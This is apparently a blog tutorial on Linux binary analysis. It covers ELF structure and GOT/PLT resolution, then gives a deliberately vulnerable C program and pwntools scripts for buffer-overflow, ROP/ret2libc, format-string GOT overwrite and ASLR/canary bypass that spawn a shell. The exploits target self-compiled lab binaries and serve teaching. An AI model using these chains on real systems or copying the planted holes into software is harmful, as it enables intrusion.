---
title: "Linux Binary Analysis: ELF Format, GOT/PLT Hijacking, and Return-Oriented Programming"
description: "Comprehensive guide to reversing Linux ELF binaries, analyzing GOT/PLT relocation mechanisms, exploiting buffer overflows with ROP chains, and bypassing modern protections like NX, ASLR, and stack canaries."
pubDate: 2024-05-27
author: "Mamone Tarsia"
tags: ["reverse-engineering", "linux", "exploits", "binary-analysis"]
draft: false
---

## Introduction

Linux binary analysis focuses on understanding ELF (Executable and Linkable Format) files, dynamic linking mechanisms, and exploitation techniques. This guide covers practical reverse engineering and exploitation of Linux binaries.

## ELF Binary Structure

### ELF Header Analysis

```bash
# Examine ELF header
readelf -h /bin/ls

# Output:
# ELF Header:
#   Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00
#   Class:                             ELF64
#   Data:                              2's complement, little endian
#   Version:                           1 (current)
#   OS/ABI:                            UNIX - System V
#   ABI Version:                       0
#   Type:                              DYN (Position-Independent Executable file)
#   Machine:                           Advanced Micro Devices X86-64
#   Entry point address:               0x6960
```

**Key ELF components**:

```c
// ELF64 header structure
typedef struct {
    unsigned char e_ident[16];     // Magic number and other info
    uint16_t      e_type;          // Object file type (ET_EXEC, ET_DYN, ET_REL)
    uint16_t      e_machine;       // Architecture (EM_X86_64, EM_ARM, etc.)
    uint32_t      e_version;       // Object file version
    uint64_t      e_entry;         // Entry point virtual address
    uint64_t      e_phoff;         // Program header table file offset
    uint64_t      e_shoff;         // Section header table file offset
    uint32_t      e_flags;         // Processor-specific flags
    uint16_t      e_ehsize;        // ELF header size in bytes
    uint16_t      e_phentsize;     // Program header table entry size
    uint16_t      e_phnum;         // Program header table entry count
    uint16_t      e_shentsize;     // Section header table entry size
    uint16_t      e_shnum;         // Section header table entry count
    uint16_t      e_shstrndx;      // Section header string table index
} Elf64_Ehdr;
```

### Section Analysis

```bash
# List all sections
readelf -S /bin/ls

# Key sections:
# .text       - Executable code
# .rodata     - Read-only data (strings, constants)
# .data       - Initialized global/static variables
# .bss        - Uninitialized global/static variables
# .got        - Global Offset Table
# .plt        - Procedure Linkage Table
# .dynamic    - Dynamic linking information
# .symtab     - Symbol table
# .strtab     - String table

# Extract .text section
objcopy --dump-section .text=text.bin /bin/ls

# Disassemble .text
objdump -D -b binary -m i386:x86-64 text.bin
```

### Program Headers

```bash
# View program headers (segments)
readelf -l /bin/ls

# Program Headers:
#   Type           Offset   VirtAddr           PhysAddr           FileSiz  MemSiz   Flg Align
#   LOAD           0x000000 0x0000000000000000 0x0000000000000000 0x003098 0x003098 R   0x1000
#   LOAD           0x004000 0x0000000000004000 0x0000000000004000 0x013f51 0x013f51 R E 0x1000
#   LOAD           0x018000 0x0000000000018000 0x0000000000018000 0x008df0 0x008df0 R   0x1000
#   LOAD           0x020df0 0x0000000000021df0 0x0000000000021df0 0x001310 0x0023a8 RW  0x1000
#   DYNAMIC        0x021100 0x0000000000022100 0x0000000000022100 0x0001f0 0x0001f0 RW  0x8
```

## Dynamic Linking: GOT/PLT

### How GOT/PLT Works

```
Function call flow:
1. Program calls printf@plt
2. PLT stub jumps to address in GOT
3. First call: GOT contains address of PLT resolver
4. Resolver calls dynamic linker (ld-linux.so)
5. Dynamic linker resolves printf address
6. GOT updated with real printf address
7. Subsequent calls: GOT contains real address
```

**Visualization**:

```asm
; First call to printf
call printf@plt

; printf@plt (in .plt section):
printf@plt:
    jmp QWORD PTR [printf@got]    ; Jump to GOT entry
    push 0                         ; Relocation index
    jmp .plt.resolve               ; Jump to resolver

; printf@got (in .got.plt section):
; Initially contains address of "push 0" instruction above
; After resolution, contains real printf address

; .plt.resolve:
    push QWORD PTR [got+8]         ; Link map
    jmp QWORD PTR [got+16]         ; Jump to ld.so resolver
```

### Analyzing GOT/PLT

```python
#!/usr/bin/env python3
"""
Parse ELF GOT/PLT entries
"""
import struct
from elftools.elf.elffile import ELFFile
from elftools.elf.relocation import RelocationSection

def analyze_got_plt(binary_path):
    with open(binary_path, 'rb') as f:
        elf = ELFFile(f)

        # Find .rela.plt section (relocations)
        rela_plt = elf.get_section_by_name('.rela.plt')

        if not isinstance(rela_plt, RelocationSection):
            print("No .rela.plt section found")
            return

        print("GOT/PLT Relocations:")
        print(f"{'Offset':<18} {'Symbol':<30} {'Type'}")
        print("=" * 70)

        for reloc in rela_plt.iter_relocations():
            symbol = elf.get_section(rela_plt['sh_link']).get_symbol(reloc['r_info_sym'])
            sym_name = symbol.name

            print(f"0x{reloc['r_offset']:016x} {sym_name:<30} {reloc['r_info_type']}")

if __name__ == '__main__':
    analyze_got_plt('/bin/ls')
```

**Output example**:

```
GOT/PLT Relocations:
Offset             Symbol                         Type
======================================================================
0x0000000000021fc0 __libc_start_main              R_X86_64_JUMP_SLOT
0x0000000000021fc8 free                           R_X86_64_JUMP_SLOT
0x0000000000021fd0 strcpy                         R_X86_64_JUMP_SLOT
0x0000000000021fd8 printf                         R_X86_64_JUMP_SLOT
```

## Buffer Overflow Exploitation

### Vulnerable Program

```c
// vuln.c
#include <stdio.h>
#include <string.h>

void secret_function() {
    printf("You found the secret!\n");
    system("/bin/sh");
}

void vulnerable_function() {
    char buffer[64];
    printf("Enter input: ");
    gets(buffer);  // VULNERABLE: No bounds checking
    printf("You entered: %s\n", buffer);
}

int main(int argc, char* argv[]) {
    vulnerable_function();
    return 0;
}
```

Compile without protections:

```bash
gcc -o vuln vuln.c -fno-stack-protector -z execstack -no-pie
```

### Exploitation

```python
#!/usr/bin/env python3
"""
Simple buffer overflow exploit
"""
import struct

# Find offset to return address
# Use pattern_create.rb from Metasploit or gdb-peda
offset = 72

# Address of secret_function (from `objdump -d vuln | grep secret`)
secret_addr = 0x401152

# Build payload
payload = b'A' * offset
payload += struct.pack('<Q', secret_addr)  # Overwrite return address

# Write to file for testing
with open('payload.txt', 'wb') as f:
    f.write(payload)

# Test: (echo -ne "...payload..."; cat) | ./vuln
```

**Finding the offset with GDB**:

```bash
# Generate cyclic pattern
gdb-peda$ pattern_create 200
# Output: AAA%AAsAABAA$AAnAACAA...

# Run program
gdb-peda$ r
# Enter pattern when prompted
# Program crashes with RIP = 0x4141304141396341

# Find offset
gdb-peda$ pattern_offset 0x4141304141396341
# Output: 1094793585481335617 found at offset: 72
```

## Return-Oriented Programming (ROP)

### ROP Basics

When NX (No-Execute) is enabled, we cannot execute shellcode on the stack. Instead, we chain together existing code "gadgets".

**Gadget**: Short instruction sequence ending in `ret`

```asm
; Example gadgets:
pop rdi; ret          ; Load argument into RDI
pop rsi; ret          ; Load argument into RSI
mov rax, [rdi]; ret   ; Dereference pointer
syscall; ret          ; Make system call
```

### Finding Gadgets

```bash
# Using ROPgadget
ROPgadget --binary /bin/ls > gadgets.txt

# Common useful gadgets:
# 0x00000000004011db : pop rdi ; ret
# 0x00000000004011d9 : pop rsi ; pop r15 ; ret
# 0x0000000000401016 : ret

# Using ropper
ropper --file /bin/ls --search "pop rdi"
```

### Building ROP Chain

```python
#!/usr/bin/env python3
"""
ROP chain to call system("/bin/sh")
"""
import struct

# Gadget addresses (from ROPgadget)
pop_rdi = 0x4011db
ret = 0x401016

# Libc addresses (leaked or from vmmap)
system_addr = 0x7ffff7e19290
binsh_addr = 0x7ffff7f6e1bd  # "/bin/sh" string in libc

# Build ROP chain
rop_chain = b''
rop_chain += struct.pack('<Q', pop_rdi)        # pop rdi; ret
rop_chain += struct.pack('<Q', binsh_addr)     # "/bin/sh" address
rop_chain += struct.pack('<Q', ret)            # ret (stack alignment)
rop_chain += struct.pack('<Q', system_addr)    # system()

# Complete payload
offset = 72
payload = b'A' * offset + rop_chain

print(payload.hex())
```

### Advanced ROP: ret2libc

```python
#!/usr/bin/env python3
"""
ret2libc with ASLR bypass
"""
from pwn import *

context.arch = 'amd64'

# Start process
p = process('./vuln')

# Gadgets
pop_rdi = 0x4011db
pop_rsi_r15 = 0x4011d9
ret = 0x401016

# PLT/GOT addresses
puts_plt = 0x401030
puts_got = 0x404018
main = 0x401189

# Stage 1: Leak libc address
print("[*] Stage 1: Leaking libc base")

payload = b'A' * 72
payload += p64(pop_rdi)
payload += p64(puts_got)       # Argument: GOT entry of puts
payload += p64(puts_plt)       # Call puts to leak GOT
payload += p64(main)           # Return to main for second exploit

p.sendline(payload)
p.recvuntil(b'You entered:')

# Receive leaked address
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
print(f"[+] Leaked puts address: 0x{leak:x}")

# Calculate libc base (puts offset in libc is 0x80ed0)
libc_base = leak - 0x80ed0
system = libc_base + 0x50d70    # system offset
binsh = libc_base + 0x1d8678    # "/bin/sh" offset

print(f"[+] Libc base: 0x{libc_base:x}")
print(f"[+] system: 0x{system:x}")
print(f"[+] /bin/sh: 0x{binsh:x}")

# Stage 2: Execute system("/bin/sh")
print("[*] Stage 2: Spawning shell")

payload = b'A' * 72
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(ret)             # Stack alignment for Ubuntu 18+
payload += p64(system)

p.sendline(payload)

# Interact with shell
p.interactive()
```

## GOT Overwrite Attack

### Vulnerability

```c
// Format string vulnerability allows arbitrary write
void vulnerable_fmt() {
    char buffer[256];
    fgets(buffer, sizeof(buffer), stdin);
    printf(buffer);  // VULNERABLE: User-controlled format string
}
```

### Exploitation

```python
#!/usr/bin/env python3
"""
GOT overwrite via format string
"""
from pwn import *

context.arch = 'amd64'

elf = ELF('./vuln')
p = process('./vuln')

# Addresses
exit_got = elf.got['exit']        # GOT entry for exit()
win_func = elf.symbols['secret_function']

print(f"[*] exit@got: 0x{exit_got:x}")
print(f"[*] win function: 0x{win_func:x}")

# Overwrite exit@got with win_func address
# Using %n format specifier to write

# Split address into two 32-bit writes
low = win_func & 0xffffffff
high = (win_func >> 32) & 0xffffffff

# Build format string
# %<value>c writes <value> characters
# %<arg>$n writes number of characters to address at arg

payload = b''
payload += p64(exit_got)          # Address to write (arg 6)
payload += p64(exit_got + 4)      # Address + 4 (arg 7)

# Write low 4 bytes
payload += f"%{low}c%6$n".encode()

# Write high 4 bytes
payload += f"%{high - low}c%7$n".encode()

p.sendline(payload)
p.interactive()
```

## Protection Bypass Techniques

### NX Bypass (ROP)

Already covered in ROP section above.

### ASLR Bypass

```python
#!/usr/bin/env python3
"""
ASLR bypass via information leak
"""
from pwn import *

# Method 1: Leak stack address
def leak_stack():
    p = process('./vuln')

    # Format string to leak stack
    payload = b'%p.' * 20
    p.sendline(payload)

    leaks = p.recvline().split(b'.')
    stack_leak = int(leaks[5], 16)  # Adjust index as needed

    print(f"[+] Stack leak: 0x{stack_leak:x}")
    return stack_leak

# Method 2: Partial overwrite (brute force)
def partial_overwrite():
    # ASLR randomizes high bytes, low 12 bits constant
    # Overwrite only low 2 bytes with known value

    for attempt in range(0x1000):
        try:
            p = process('./vuln')

            # Overwrite only 2 bytes
            payload = b'A' * 72
            payload += b'\x60\x41'  # Low 2 bytes of target address

            p.sendline(payload)

            # Check if successful
            response = p.recv(timeout=1)
            if b'shell' in response:
                print(f"[+] Success on attempt {attempt}")
                p.interactive()
                break

            p.close()
        except:
            continue
```

### Stack Canary Bypass

```c
// Program with stack canary
void vulnerable() {
    char buffer[64];
    gets(buffer);  // Overflow, but canary will detect
}

// Compiled with: gcc -fstack-protector-all
```

**Bypass via leak**:

```python
#!/usr/bin/env python3
"""
Leak stack canary using format string
"""
from pwn import *

p = process('./vuln_canary')

# Leak canary (usually at specific offset on stack)
payload = b'%p.' * 30
p.sendline(payload)

leaks = p.recvline().split(b'.')
canary = int(leaks[17], 16)  # Canary at offset 17 (example)

print(f"[+] Leaked canary: 0x{canary:x}")

# Build exploit preserving canary
offset_to_canary = 64
offset_to_ret = 72

payload = b'A' * offset_to_canary
payload += p64(canary)
payload += b'B' * (offset_to_ret - offset_to_canary - 8)
payload += p64(0x401234)  # Return address

p.sendline(payload)
p.interactive()
```

## Static Analysis Tools

### Ghidra Scripting

```python
# Ghidra Python script: find_dangerous_functions.py
from ghidra.app.decompiler import DecompInterface
from ghidra.util.task import ConsoleTaskMonitor

# Get current program
program = getCurrentProgram()

# Dangerous functions
dangerous = ['gets', 'strcpy', 'sprintf', 'scanf', 'strcat']

# Find all calls to dangerous functions
listing = program.getListing()
monitor = ConsoleTaskMonitor()

print("Dangerous function calls:")
for func_name in dangerous:
    # Get function
    func = getGlobalFunctions(func_name)

    for f in func:
        # Get all references to this function
        refs = getReferencesTo(f.getEntryPoint())

        for ref in refs:
            call_addr = ref.getFromAddress()
            calling_func = getFunctionContaining(call_addr)

            if calling_func:
                print(f"  {calling_func.getName()} calls {func_name} at {call_addr}")
```

### Binary Ninja Automation

```python
# Binary Ninja script: analyze_rop_gadgets.py
import binaryninja as bn

def find_rop_gadgets(bv):
    """Find useful ROP gadgets"""
    gadgets = {
        'pop_rdi': [],
        'pop_rsi': [],
        'syscall': [],
        'ret': []
    }

    # Scan for gadget patterns
    for func in bv.functions:
        for block in func.low_level_il:
            # Find pop rdi; ret
            if (block.operation == bn.LowLevelILOperation.LLIL_POP and
                block.dest == bn.RegisterIndex.RDI):
                next_insn = block.address + block.size
                if bv.read(next_insn, 1)[0] == 0xc3:  # ret opcode
                    gadgets['pop_rdi'].append(block.address)

            # Find syscall; ret
            if block.operation == bn.LowLevelILOperation.LLIL_SYSCALL:
                next_insn = block.address + block.size
                if bv.read(next_insn, 1)[0] == 0xc3:
                    gadgets['syscall'].append(block.address)

    # Print results
    for gadget_type, addresses in gadgets.items():
        print(f"\n{gadget_type}:")
        for addr in addresses:
            print(f"  0x{addr:x}")

# Run
bv = binaryninja.BinaryViewType.get_view_of_file("vuln")
find_rop_gadgets(bv)
```

## Conclusion

Linux binary exploitation requires mastery of:
1. ELF format understanding (headers, sections, segments)
2. Dynamic linking mechanisms (GOT/PLT)
3. Protection mechanisms (NX, ASLR, Stack Canaries, PIE)
4. Exploitation techniques (Buffer Overflow, ROP, ret2libc, GOT overwrite)
5. Analysis tools (GDB, Ghidra, Binary Ninja, pwntools)

Modern Linux systems employ multiple security layers, but understanding these fundamentals enables both offensive research and defensive hardening.

## References

1. ELF Specification - System V ABI
2. Aleph One (1996). "Smashing the Stack for Fun and Profit"
3. Shacham, H. (2007). "The Geometry of Innocent Flesh on the Bone: Return-into-libc without Function Calls"
4. pwntools Documentation
5. Linux Kernel Documentation - ELF Loading
